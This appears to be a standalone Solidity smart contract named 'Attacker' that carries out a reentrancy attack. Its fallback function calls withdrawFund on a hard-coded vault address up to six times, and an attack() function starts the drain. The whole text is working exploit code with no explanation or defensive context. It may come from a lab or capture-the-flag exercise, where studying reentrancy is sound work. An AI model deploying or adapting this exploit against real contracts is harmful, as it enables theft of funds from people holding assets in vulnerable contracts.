contract Attacker {
    uint public stack = 0;
    VaultAbs vault;
    
    function Attacker() {
        vault = VaultAbs(0x464559aaa8974d3f426e12e1ca0b7b85acc20dbd);
    }
    
    function() payable {
        if(stack++ <= 5) {
            vault.withdrawFund(0x2e052aeBE11d17Dd5aE86BC8a4e5F041E89bFd51);
        }
    }
    
    function attack() {
        stack = 0;
        vault.withdrawFund(0x2e052aeBE11d17Dd5aE86BC8a4e5F041E89bFd51);
    }
}